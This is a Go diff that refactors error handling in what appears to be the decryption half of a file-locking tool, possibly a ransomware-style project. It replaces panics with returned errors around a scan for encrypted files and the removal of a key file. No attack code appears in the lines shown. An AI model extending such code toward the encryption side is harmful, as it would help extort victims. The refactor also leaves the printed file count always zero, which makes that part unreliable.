@@ -13,27 +13,26 @@ import (
 	scan "frostbite.com/tools/scan"
 )
 
-func ErrCheck(err error) {
-	if err != nil {
-		panic(err)
-	}
-}
-
-func RunDencryptForCurrentDir(AESKey []byte) (fileList []string) {
+func RunDencryptForCurrentDir(AESKey []byte) (fileList []string, err error) {
 	timeToScan := time.Now()
 	//get pwd
 	currentDir, err := os.Getwd()
-	ErrCheck(err)
+	if err != nil {
+		return nil, err
+	}
 	DecryptFilesInDir(currentDir, true, AESKey)
 	timeToScanEnd := time.Now()
 	cf.PrintGood("Files found: " + strconv.Itoa(len(fileList)))
 	cf.PrintInfo("Time to scan user files: " + timeToScanEnd.Sub(timeToScan).String())
-	return fileList
+	return fileList, nil
 }
-func DecryptFilesInDir(startDirPath string, skipHiddenDirs bool, AESKey []byte) {
+func DecryptFilesInDir(startDirPath string, skipHiddenDirs bool, AESKey []byte) error {
 	//scan only non hidden directories
 	runtime.GOMAXPROCS(runtime.NumCPU())
-	filesToDecrypt := scan.ScanForEncFilesInDir(startDirPath, skipHiddenDirs)
+	filesToDecrypt, err := scan.ScanForEncFilesInDir(startDirPath, skipHiddenDirs)
+	if err != nil {
+		return err
+	}
 
 	wg := sync.WaitGroup{}
 	wg.Add(len(filesToDecrypt))
@@ -52,6 +51,7 @@ func DecryptFilesInDir(startDirPath string, skipHiddenDirs bool, AESKey []byte) 
 	os.Remove("decrypted.key")
 	cf.Remove()
 
+	return nil
 }
 func UnlockFilesArray(filesToEncrypt []string, AESKey []byte) {
 	//scan only non hidden directories
